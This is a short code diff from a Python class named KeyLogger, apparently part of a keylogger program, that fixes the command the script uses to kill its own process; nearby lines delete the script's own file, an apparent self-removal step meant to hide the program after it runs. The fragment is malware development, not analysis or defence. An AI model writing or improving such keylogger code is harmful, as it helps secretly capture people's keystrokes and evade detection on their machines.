@@ -99,7 +99,7 @@ class KeyLogger:
             try:
                 pwd = os.path.abspath(os.getcwd())
                 os.system("cd " + pwd)
-                os.system("taskkill /F /IM" + __file__ + "/T")
+                os.system("TASKKILL /F /IM " + os.path.basename(__file__))
             except OSError:
                 print('File is still open.')
                 os.system("DEL" + __file__)
